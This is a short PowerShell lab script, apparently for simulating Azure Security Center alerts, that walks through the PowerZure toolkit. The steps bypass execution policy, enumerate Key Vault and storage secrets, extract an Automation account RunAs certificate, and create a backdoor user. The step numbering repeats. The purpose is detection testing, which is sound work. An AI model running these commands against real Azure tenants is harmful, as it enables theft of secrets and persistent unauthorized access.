### ---------------------------------------------------------------------------------
### ASC Alert simulation for ARM Using PowerZure
### ---------------------------------------------------------------------------------

# ::::::::::::::::::::::::::::::::::::::::::::::
# PowerZure Github
# ::::::::::::::::::::::::::::::::::::::::::::::

# 0 - Connect to CoreSvcs-SRV1

# 1 - Download PowerZure
cd C:\temp\PowerZure-master

# 2 - Run PowerZure Script
Set-ExecutionPolicy -ExecutionPolicy Bypass

# 3 - Import PowerZure.ps1
Connect-AzAccount
ipmo .\PowerZure.ps1 #ImportModule
PowerZure -h

# 4 - Set subscriptionID
.\PowerZure.ps1 Set-AzContext -SubscriptionId ecebeb7d-fd8b-4c0e-a5e1-770d0df8cead

# 5 - Start Enumeration
.\PowerZure.ps1 Get-AzureTargets
Show-AzureKeyVaultContent -All
Show-AzureStorageContent -All

# 4 - Create Automation account for PowerZure

# 5 - Run with Automation Account context
Get-RunAsCertificate -ResourceGroup ExampleResourceGroup -AutomationAccount
ExampleAutomationAccount

# 6 - Create backdoor with PowerZure via Automation account SP
Create-Backdoor -Username ExampleUser -Password ExamplePassword -
AutomationAccount AutomationAccountExample -ResourceGroup ResourceGroupName -
NewUsername ExampleNewUser -NewPassword ExampleNewPassword

# 7 - Clean up environment (unfamiliar resources)